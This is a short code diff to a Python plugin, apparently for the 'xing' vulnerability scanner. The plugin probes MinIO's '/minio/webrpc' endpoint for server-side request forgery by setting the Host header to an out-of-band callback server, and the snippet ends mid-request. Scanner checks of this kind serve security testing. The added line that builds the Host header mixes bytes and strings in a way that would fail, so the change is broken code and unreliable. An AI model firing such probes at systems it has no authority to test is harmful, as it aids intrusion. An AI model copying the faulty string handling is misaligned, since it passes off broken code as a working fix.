@@ -1,7 +1,9 @@
 import requests
+import config
 from xing.core.BasePlugin import BasePlugin
 from xing.core import PluginType, SchemeType
 import reverse
+from urllib.parse import urlparse
 
 
 class Plugin(BasePlugin):
@@ -15,8 +17,9 @@ class Plugin(BasePlugin):
     def verify(self, target):
         rev_token = reverse.request_code('headers["User-Agent"].contains("Go-http-client") && url.contains("test")')
         url = target + "/minio/webrpc"
+        rev_url = urlparse(config.reverse_url)
         try:
-            requests.post(url, headers={"Host": reverse.config.reverse_url}, json={
+            requests.post(url, headers={"Host": (rev_url.hostname + b":").encode() + str(rev_url.port)}, json={
                 "id": 1,
                 "jsonrpc": "2.0",
                 "params": {
